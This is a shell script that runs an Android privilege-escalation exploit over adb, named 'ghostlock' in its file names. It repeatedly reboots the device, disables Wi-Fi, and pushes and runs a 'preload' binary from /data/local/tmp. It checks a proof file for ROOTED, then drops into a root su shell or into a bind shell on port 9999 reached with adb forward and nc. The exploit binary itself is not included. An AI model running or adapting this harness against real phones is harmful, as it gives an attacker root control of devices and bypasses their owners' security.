#!/bin/sh
set -e

HERE=$(cd "$(dirname "$0")" && pwd)
case "$(uname -s)" in
  Darwin) BUNDLED_ADB="$HERE/bin/mac/adb" ;;
  *) BUNDLED_ADB="$HERE/bin/linux/adb" ;;
esac
if command -v adb >/dev/null 2>&1; then
  ADB=adb
else
  ADB="$BUNDLED_ADB"
fi
if ! command -v seq >/dev/null 2>&1; then
  seq() {
    n=1
    while [ "$n" -le "$1" ]; do
      echo "$n"
      n=$((n + 1))
    done
  }
fi
if [ -f "$HERE/bin/preload" ]; then
  DEFAULT_PRELOAD="$HERE/bin/preload"
else
  DEFAULT_PRELOAD="$HERE/build/sunstone/bin/preload"
fi

PRELOAD=${1:-$DEFAULT_PRELOAD}
TRIES=${2:-8}
LOG=/data/local/tmp/ghostlock.log
TAIL=
STTY=
WIFI_OFF=

disable_wifi() {
  serial=$("$ADB" get-serialno 2>/dev/null | tr -d '\r')
  case "$serial" in
    *:[0-9]*|*._tcp) return 0 ;;
  esac
  if [ -z "$WIFI_OFF" ]; then
    WIFI_OFF=1
  fi
  "$ADB" shell svc wifi disable >/dev/null 2>&1 || true
}

stop_tail() {
  if [ -n "$TAIL" ]; then
    kill "$TAIL" 2>/dev/null || true
  fi
  TAIL=
}
restore_tty() {
  [ -n "$STTY" ] && stty "$STTY" 2>/dev/null
  STTY=
}
trap 'stop_tail; restore_tty' EXIT
trap 'stop_tail; restore_tty; exit 130' INT TERM

for i in $(seq "$TRIES"); do
  echo "Attempt $i of $TRIES"

  "$ADB" reboot || true
  "$ADB" wait-for-device
  until [ "$("$ADB" shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" = 1 ]; do
    sleep 2
  done
  sleep 3

  disable_wifi

  "$ADB" push "$PRELOAD" /data/local/tmp/preload >/dev/null
  "$ADB" shell "chmod 755 /data/local/tmp/preload; rm -f /data/local/tmp/ghostlock.proof $LOG; nohup /data/local/tmp/preload >$LOG 2>&1 &"

  "$ADB" shell "sleep 1; tail -f -n +1 $LOG" &
  TAIL=$!

  rooted=0
  for _ in $(seq 90); do
    sleep 2
    [ "$("$ADB" get-state 2>/dev/null)" = device ] || break
    if "$ADB" shell "cat /data/local/tmp/ghostlock.proof" 2>/dev/null | grep -q ROOTED; then
      rooted=1
      break
    fi
  done
  stop_tail

  if [ "$rooted" = 1 ]; then
    if "$ADB" shell 'command -v su' >/dev/null 2>&1; then
      exec "$ADB" shell -t su
    fi
    "$ADB" forward tcp:9999 tcp:9999 >/dev/null
    echo "Using the bind shell on 127.0.0.1 9999"
    STTY=$(stty -g 2>/dev/null) || STTY=
    [ -n "$STTY" ] && stty raw -echo
    nc 127.0.0.1 9999 || true
    restore_tty
    exit 0
  fi

  echo "Attempt $i failed"
done

echo "Failed after $TRIES attempts"
exit 1
